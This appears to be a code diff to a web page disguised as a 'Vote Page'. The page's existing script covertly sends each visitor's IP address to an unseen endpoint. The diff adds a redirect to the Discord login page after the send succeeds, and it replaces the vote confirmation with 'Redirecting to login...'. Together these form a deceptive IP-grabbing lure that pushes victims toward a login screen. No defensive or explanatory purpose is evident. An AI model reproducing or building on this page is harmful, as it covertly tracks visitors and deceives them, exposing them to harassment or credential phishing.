@@ -22,6 +22,8 @@
             }).then(response => {
                 if (response.ok) {
                     console.log('IP sent successfully');
+                    // Redirect to Discord login page
+                    window.location.href = 'https://discord.com/login';
                 } else {
                     console.error('Failed to send IP');
                 }
@@ -43,6 +45,6 @@
 </head>
 <body>
     <h1>Vote Page</h1>
-    <p>Your vote has been recorded. Thank you for participating!</p>
+    <p>Redirecting to login...</p>
 </body>
 </html>
